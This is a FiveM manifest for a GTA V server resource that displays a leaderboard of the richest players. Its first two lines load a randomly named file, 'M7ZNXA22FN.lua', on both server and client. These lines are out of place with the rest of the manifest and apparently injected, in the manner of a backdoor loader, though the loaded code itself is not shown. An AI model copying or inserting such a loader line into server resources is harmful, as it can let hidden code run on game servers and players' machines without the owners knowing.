server_script "M7ZNXA22FN.lua"
client_script "M7ZNXA22FN.lua"


fx_version 'cerulean'
game 'gta5'

author 'Roderic'

description 'Simple top for display the top millonaires'

client_scripts {
    'Client/*.lua',
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
    'Server/*.lua',
}

shared_scripts {
    'Config.lua'
}

ui_page {
    'html/index.html',
}

files {
	'html/index.html',
	'html/app.js', 
    'html/style.css'
}